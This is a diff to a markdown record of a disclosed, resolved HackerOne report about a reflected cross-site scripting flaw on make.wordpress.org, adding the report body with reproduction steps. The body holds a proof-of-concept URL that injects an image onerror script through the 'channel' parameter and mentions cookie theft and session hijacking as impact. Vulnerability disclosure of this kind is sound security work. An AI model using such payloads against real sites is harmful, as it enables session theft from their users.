@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "Cross-site Scripting (XSS) - Reflected"
 enriched: true
+body: true
 date: 2019-08-26
 submitted: 2019-07-25T10:56:27.823Z
 bounty_usd: null
@@ -26,6 +27,27 @@ title: "Reflected XSS on https://make.wordpress.org via 'channel' parameter"
 - Report: [https://hackerone.com/reports/659419](https://hackerone.com/reports/659419)
 - CWE: Cross-site Scripting (XSS) - Reflected
 - Submitted: 2019-07-25T10:56:27.823Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hi there,
+I just found a reflected XSS on make.wordpress.org domain.
+
+steps to reproduce : 
+1. visit this link :
+https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
+2. xss pop up will occurs
+
+POC:
+see:wp reflected xss.png
+
+Note: it works on the latest version of firefox
+
+## Impact
+
+some of xss impact like stealing cookies, session hijacking, etc ..
 
 ## Timeline
 
